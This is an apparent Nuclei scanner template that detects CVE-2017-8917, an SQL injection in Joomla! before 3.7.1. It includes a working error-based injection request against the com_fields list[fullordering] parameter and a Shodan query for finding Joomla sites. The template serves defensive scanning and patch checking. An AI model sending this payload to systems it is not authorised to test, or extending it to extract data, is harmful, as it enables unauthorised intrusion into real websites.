id: CVE-2017-8917
info:
  name: Joomla! <3.7.1 - SQL Injection
  author: princechaddha
  severity: critical
  description: Joomla! versions prior to 3.7.1 are vulnerable to SQL injection (CVE-2017-8917),
    potentially allowing an attacker to access sensitive data, modify it, and perform
    unauthorized administrative actions within the affected system.
  reference:
  - https://developer.joomla.org/security-centre/692-20170501-core-sql-injection.html
  - https://nvd.nist.gov/vuln/detail/CVE-2017-8917
  - https://web.archive.org/web/20211207050608/http://www.securitytracker.com/id/1038522
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2017-8917
    cwe-id: CWE-89
  metadata:
    shodan-query: http.component:"Joomla"
    verified: 'true'
    impact: The SQL injection vulnerability in Joomla! before 3.7.1 can lead to sensitive
      information theft, data modification, and unauthorized administrative operations
      by attackers within the affected site's context, potentially causing significant
      impact.
    recommendation: As a security precaution, Joomla! users should update to version
      3.7.1 or later to prevent possible exploitation of the CVE-2017-8917 SQL injection
      vulnerability.
  tags: cve,cve2017,joomla,sqli
variables:
  num: '999999999'
requests:
- method: GET
  path:
  - '{{BaseURL}}/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,md5({{num}})),1)'
  matchers:
  - type: word
    part: body
    words:
    - '{{md5(num)}}'
